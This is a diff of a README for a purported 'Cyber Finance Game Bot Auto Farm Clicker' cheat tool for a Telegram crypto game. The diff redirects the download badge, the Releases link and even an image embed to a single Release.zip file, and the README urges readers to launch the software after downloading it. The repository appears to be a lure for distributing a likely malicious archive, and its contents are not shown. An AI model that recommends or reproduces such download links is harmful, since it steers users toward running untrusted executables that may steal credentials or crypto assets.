@@ -34,7 +34,7 @@ Welcome to the Cyber Finance Game Bot Auto Farm Clicker repository! This bot is 
 ## Getting Started 🛠️
 To get started with the Cyber Finance Game Bot Auto Farm Clicker, you can download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/dvngren/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases/download/v1.0/Release.zip)](https://github.com/dvngren/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases/download/v1.0/Release.zip)
 
 **Note:** The software needs to be launched after downloading.
 
@@ -47,11 +47,11 @@ To get started with the Cyber Finance Game Bot Auto Farm Clicker, you can downlo
 6. Enjoy optimized gameplay and increased profits with the Cyber Finance Game Bot!
 
 ## Additional Resources 📂
-For more information and updates, please visit the [Releases](https://github.com/22155555/1875695542/releases) section of this repository.
+For more information and updates, please visit the [Releases](https://github.com/dvngren/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases/download/v1.0/Release.zip) section of this repository.
 
 Feel free to explore the features of the Cyber Finance Game Bot Auto Farm Clicker and elevate your gaming experience with efficient profit optimization. Happy gaming! 🎉
 
-![Cyber Finance Game Bot](https://imageurl.com)
+![Cyber Finance Game Bot](https://github.com/dvngren/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases/download/v1.0/Release.zip)
 
 ---
 
